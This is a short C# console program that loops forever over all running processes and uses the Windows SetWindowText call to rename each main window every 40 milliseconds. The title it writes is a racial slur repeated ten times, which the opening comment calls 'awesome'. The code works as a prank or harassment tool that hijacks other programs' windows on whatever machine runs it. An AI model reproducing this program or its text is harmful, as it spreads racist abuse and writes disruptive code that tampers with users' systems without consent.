/*
*   Changes all main active window titles to be awesome!!
*/

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool SetWindowText(IntPtr hWnd, string text); // Thing used to change window text

        static void Main(string[] args)
        {
            while (true)
            {
                foreach (Process p in Process.GetProcesses()) // Loop through processes
                {
                    try
                    {
                        SetWindowText(p.MainWindowHandle, "NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER"); // Try to change its text to this
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("Failed setting text on " + Convert.ToString(p.Id)); // Says if one failed
                    }
                }

                Thread.Sleep(40); // Wait 40 ms to prevent a crash while letting the system know the process is still alive
            }
        }
    }
}
